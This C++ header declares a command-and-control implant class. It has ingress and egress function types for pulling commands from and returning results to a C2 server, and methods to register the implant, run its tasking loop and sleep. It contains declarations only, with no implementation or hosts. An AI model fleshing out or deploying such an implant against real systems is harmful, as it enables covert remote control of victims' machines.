#pragma once

#include <string>
#include <map>
#include <vector>
#include <iostream>
#include <thread>
#include <chrono>
#include "../data/msgpack/msgpack.h"

// --- Signatures ---

// Ingress: Returns a JSON object (command + metadata), takes current UUID
using IngressFunc = nlohmann::json(*)(std::string implant_uuid);

// Output: Takes the result string and sends it back to server
using EgressFunc = int (*)(std::string implant_uuid, std::string text_data, std::string task_uuid);


// --- The Dispatcher Class ---

class C2Implant {
public:
    // --- Static Storage for Strategies (Shared by all) ---
    // Naming: s_camelCase for statics
    static std::map<std::string, IngressFunc> s_ingress_map;
    static std::map<std::string, EgressFunc> s_egress_map;


    // --- Instance Data (Specific to this agent) ---
    // Naming: snake_case_ for members
    std::string implant_uuid_;

    // --- Lifecycle Methods ---

    // 1. Wires up the map (Static because it sets up the s_vars)
    static void init();

    // 2. Registers with C2 to get UUID (Instance: modifies implant_uuid_)
    int register_implant();

    // 3. The Main Loop (Instance: uses implant_uuid_)
    void cycle();

private:
    // Internal helper to wrap sleep logic
    void sleep_implant();
};